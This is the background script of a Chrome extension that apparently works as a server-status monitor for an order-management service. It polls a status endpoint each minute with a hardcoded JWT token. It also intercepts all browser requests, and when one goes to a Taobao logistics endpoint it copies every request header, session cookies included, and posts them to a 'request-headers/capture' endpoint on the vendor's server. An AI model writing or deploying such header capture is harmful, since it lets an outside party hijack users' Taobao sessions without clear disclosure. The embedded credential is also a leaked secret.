/**/
// chrome.browserAction.setBadgeBackgroundColor({color: '#85ff2d'});
// chrome.browserAction.setBadgeText({text: '正常'});
//
var headers = {'Authorization': 'OC2LEE eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJjZWFwaSIsImNyZWF0ZWQiOjE1MTI3NDU3ODM4MjQsImV4cCI6MTUyODI5Nzc4M30.u-lSCkinSMXphcjqvVQsJbbGLOuY8x8F-V4GmEbYzRYcWPiEPQMuUpkbP39H2hIqEmsnKdHQ4ZrCvooDzfmW7Q'}


setInterval(function () {
    var jqXhr = $.ajax({
        url: 'https://ordercat2-api.maijufenxiao.com/ce/check/server/status',
        contentType: "application/json",
        headers: headers,
        type: 'get'//,
        //data:JSON.stringify(requestData)
    });
    jqXhr.done(function (data) {

        chrome.browserAction.setBadgeBackgroundColor({color: '#93ff6f'});
        chrome.browserAction.setBadgeText({text: '正常'});

        //console.log('common callback', data);
    })
        .fail(function (xhr) {
            //console.log('error xhr ', xhr);

            chrome.browserAction.setBadgeBackgroundColor({color: '#ff160a'});
            chrome.browserAction.setBadgeText({text: '错误'});
            var failJson = xhr.responseJSON;
            if(failJson){
                chrome.notifications.create({
                        type: 'basic',
                        iconUrl: 'icon-128.png',
                        title: '服务状态异常!',
                        message:  failJson.message,
                        // buttons: [
                        //     {title: 'Keep it Flowing.'}
                        // ],
                        priority: 0
                    }
                );
                //console.log('error common back', failJson);
            }else {
                chrome.notifications.create({
                        type: 'basic',
                        iconUrl: 'icon-128.png',
                        title: '服务状态异常!',
                        message:  "与服务器通信异常!请检查网络!",
                        // buttons: [
                        //     {title: 'Keep it Flowing.'}
                        // ],
                        priority: 0
                    }
                );
            }



        });
}, 60000);

function onBeforeSendHeaders(details) {
    var requestHeaders = details.requestHeaders;
    if (details.url.indexOf("://wuliu.taobao.com/user/ajax_guess_mail_no.do") != -1) {
        var requestData = {};
        for (var i = 0; i < requestHeaders.length; i++) {
            requestData[requestHeaders[i].name] = requestHeaders[i].value;
        }
        $.ajax({
            url: 'https://ordercat2-api.maijufenxiao.com/ce/taobao/guess-mail-no/request-headers/capture',
            contentType: "application/json",
            headers: headers,
            type: 'post',
            data: JSON.stringify(requestData),
            dataType: 'json',
            success: function (data) {
                console.log(data);
            }
        });
    }
    return {requestHeaders: requestHeaders}
}
chrome.webRequest.onBeforeSendHeaders.addListener(onBeforeSendHeaders,
    {urls: ["<all_urls>"]},
    ["blocking", "requestHeaders"]
);
